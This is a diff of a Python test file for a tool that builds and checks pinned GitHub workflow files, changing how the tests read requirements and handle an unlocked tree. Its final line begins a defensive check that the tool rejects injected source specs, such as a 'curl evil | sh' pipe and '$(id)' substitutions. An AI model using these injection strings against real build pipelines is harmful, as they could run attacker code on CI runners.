@@ -1152,7 +1152,7 @@ def _lock(tmp_path: Path, pub, release: str | None = None) -> Path:
     return out
 
 
-def test_the_published_set_is_the_source_byte_for_byte_with_the_lock_written_in(tmp_path, capsys):
+def test_the_published_set_is_the_source_byte_for_byte_with_the_lock_written_in(tmp_path, capsys, monkeypatch):
     pub = _script("pinned_workflows")
     out, lock = tmp_path / "knos-workflows", _lock(tmp_path, pub)
     assert pub.main(["build", str(out), "--lock", str(lock)]) == 0
@@ -1161,7 +1161,7 @@ def test_the_published_set_is_the_source_byte_for_byte_with_the_lock_written_in(
                      "LICENSE", "README.md", "requirements/sign.txt"]
     # the lock: requirements/sign.txt of this repository, and the wheel by its hash as the last line
     text = lock.read_text(encoding="utf-8")
-    third_party = (ROOT / "requirements" / "sign.txt").read_text(encoding="utf-8")
+    third_party = pub.third_party()             # requirements/sign.txt without the wheel's line, whether the tree is locked or not
     assert text == third_party + f"knos=={_release()} --hash=sha256:{hashlib.sha256(WHEEL).hexdigest()}\n"
     assert (out / "requirements" / "sign.txt").read_text(encoding="utf-8") == text
     for name in PUBLISHED:
@@ -1198,6 +1198,8 @@ def test_the_published_set_is_the_source_byte_for_byte_with_the_lock_written_in(
     assert "requirements/sign.txt is not the file this repository publishes" in said
     assert ".github/workflows/relay.yml is not part of the published set" in said and "fund.yml" not in said
     assert pub.main(["build", str(out), "--lock", str(lock)]) == 0 and pub.main(["check", str(out), "--lock", str(lock)]) == 1       # writing again repairs; a stray file is still said
+    # (as a tree is before its lock: with no lock of its own, `build DIR` and `check DIR` have nothing to publish from)
+    monkeypatch.setattr(pub, "locked", lambda: None)
     for bad in ([], ["build"], ["stamp"], ["check", "--source", "knos"], ["publish", str(out)], ["build", str(out)],
                 ["build", str(out), "--lock", str(lock), "--source", "knos"], ["check", str(out)], ["lock"]):
         with pytest.raises(SystemExit):
@@ -1234,12 +1236,12 @@ def test_the_lock_is_for_the_release_the_workflows_name_and_holds_the_wheel_and_
         pub.main(["build", str(tmp_path / "never"), "--lock", str(tmp_path / "missing.txt")])
 
 
-def test_a_rehearsal_variant_differs_in_how_knos_is_installed_and_in_nothing_else(tmp_path, capsys):
+def test_a_rehearsal_variant_differs_in_how_knos_is_installed_and_in_nothing_else(tmp_path, capsys, monkeypatch):
     pub = _script("pinned_workflows")
     spec = "git+https://github.com/drexthealpha/Knos@" + "ab" * 20
     out = tmp_path / "staging"
     assert pub.main(["build", str(out), "--source", spec]) == 0 and "REHEARSAL" in capsys.readouterr().out
-    deps = (ROOT / "requirements" / "sign.txt").read_text(encoding="utf-8")
+    deps = pub.third_party()                    # requirements/sign.txt without the wheel's line, whether the tree is locked or not
     again = f'uv pip install --no-config --python "$RUNNER_TEMP/knos/bin/python" --no-deps "{spec}"'
     for name in PUBLISHED:
         source, got = (WF / name).read_text(encoding="utf-8"), (out / ".github" / "workflows" / name).read_text(encoding="utf-8")
@@ -1253,8 +1255,12 @@ def test_a_rehearsal_variant_differs_in_how_knos_is_installed_and_in_nothing_els
     assert "REHEARSAL VARIANT" in (out / "README.md").read_text(encoding="utf-8") and spec in (out / "README.md").read_text(encoding="utf-8")
     # a staging checkout is checked against the same variant, and is never taken for the published set
     assert pub.main(["check", str(out), "--source", spec]) == 0
-    with pytest.raises(SystemExit):
-        pub.main(["check", str(out)])                      # a checkout is checked against the set it was made as, named
+    if pub.locked():                                       # a locked tree compares it with its own published set: not that
+        assert pub.main(["check", str(out)]) == 1
+    with monkeypatch.context() as m:                       # before the lock there is no set to take it for
+        m.setattr(pub, "locked", lambda: None)
+        with pytest.raises(SystemExit):
+            pub.main(["check", str(out)])                  # a checkout is checked against the set it was made as, named
     assert pub.main(["check", str(out), "--lock", str(_lock(tmp_path, pub))]) == 1
     capsys.readouterr()
     for bad in ('knos"; curl evil | sh; "', "knos==0.3.13 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
